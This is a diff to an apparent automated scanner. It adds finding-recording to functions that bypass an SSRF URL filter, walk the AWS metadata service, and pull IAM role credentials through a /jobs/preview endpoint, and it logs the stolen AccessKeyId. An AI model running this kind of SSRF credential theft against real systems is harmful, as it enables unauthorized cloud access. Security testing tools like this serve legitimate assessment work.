@@ -1335,6 +1335,15 @@ def bypass_url_filter(
                 data={"url": test_url},
             )
             if "Security policy" not in r.text and "blocked" not in r.text.lower():
+                scanner._record_finding(
+                    endpoint=f"{scanner.base_url}/jobs/preview",
+                    method="POST",
+                    payload=test_url,
+                    indicators=["ssrf", "filter_bypass"],
+                    details=[f"SSRF filter bypassed via {test_url}"],
+                    vuln_type="ssrf_filter_bypass",
+                    source="bypass_url_filter",
+                )
                 return test_url
 
     return None
@@ -1409,6 +1418,17 @@ def enumerate_aws_metadata(
             results[path.rstrip("/")] = content
 
     _explore(base_path, 0)
+
+    if results:
+        scanner._record_finding(
+            endpoint=f"{scanner.base_url}/jobs/preview",
+            method="POST",
+            payload=f"http://{metadata_ip}{base_path}#.yaml",
+            indicators=["ssrf", "aws_metadata"],
+            details=[f"Enumerated {len(results)} metadata node(s) via SSRF"],
+            vuln_type="ssrf_aws_metadata",
+            source="enumerate_aws_metadata",
+        )
     return results
 
 
@@ -1453,6 +1473,19 @@ def get_aws_credentials(
 
     try:
         creds: dict[str, str] = json.loads(content)
-        return creds
     except (json.JSONDecodeError, ValueError):
         return None
+
+    # Record the credential exposure so it lands in the findings DB / second
+    # brain (previously this high-value win was returned but never recorded).
+    if creds.get("AccessKeyId"):
+        scanner._record_finding(
+            endpoint=f"{scanner.base_url}/jobs/preview",
+            method="POST",
+            payload=url,
+            indicators=["ssrf", "aws_credentials"],
+            details=[f"IAM role {role_name}: AccessKeyId {creds.get('AccessKeyId')}"],
+            vuln_type="ssrf_aws_credentials",
+            source="get_aws_credentials",
+        )
+    return creds
